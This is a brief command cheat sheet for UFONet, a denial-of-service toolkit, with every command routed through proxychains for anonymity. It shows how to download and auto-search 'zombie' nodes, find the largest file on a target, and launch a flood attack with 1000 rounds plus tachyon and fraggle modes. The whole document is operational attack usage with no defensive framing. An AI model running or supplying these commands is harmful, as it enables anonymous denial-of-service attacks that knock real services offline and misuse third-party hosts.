## Commands

### Help

```bash
proxychains python3.11 ufonet --help
```

### Update Zombies

#### Download from community

```bash
proxychains python3.11 ufonet --download-nodes
```

```bash
proxychains python3.11 ufonet --download-zombies
```

```bash
proxychains python3.11 ufonet --download-github
```

#### Download by search

```bash
proxychains python3.11 ufonet --auto-search --xforw --xclient --threads=100
```

### Basic Attack

#### Find biggest file on target

```bash
proxychains python3.11 ufonet -i https//target.com
```

#### Attack the target

```bash
proxychains python3.11 ufonet -a https//target.com -b /path/img.jpg -r 1000 --tachyon 1000 --fraggle 1000
```
